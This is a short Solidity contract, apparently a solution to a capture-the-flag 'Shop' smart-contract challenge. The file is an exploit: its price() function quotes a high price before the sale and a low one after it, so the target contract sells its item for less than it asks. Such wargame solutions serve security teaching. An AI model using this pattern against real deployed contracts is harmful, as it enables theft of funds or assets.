// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Shop.sol';

contract ExoBuyer is Buyer {
    Shop shop;
    bool public firstCall = true;

    constructor(address payable _target) public{
        shop = Shop(_target);
    }


    function price() external view override returns (uint){
        if(shop.isSold()){
            return 10;
        } else {
            return 120;
        }
        
    }

    function execute() public {
        shop.buy();
    }
}